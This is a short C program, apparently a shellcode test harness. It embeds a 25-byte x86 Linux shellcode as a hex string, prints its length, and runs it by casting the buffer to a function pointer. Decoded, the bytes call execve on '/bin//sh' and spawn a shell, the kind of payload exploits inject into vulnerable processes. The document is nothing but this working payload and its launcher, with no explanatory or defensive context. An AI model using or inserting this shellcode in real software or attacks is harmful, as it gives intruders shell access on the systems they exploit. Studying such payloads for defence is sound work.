#include <stdio.h>
#include <string.h>

unsigned char code[] = 
"\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
	printf("Len %d\n", strlen(code));
	int (*shell)() = (int (*)())code;
	shell();
	return 0;
}
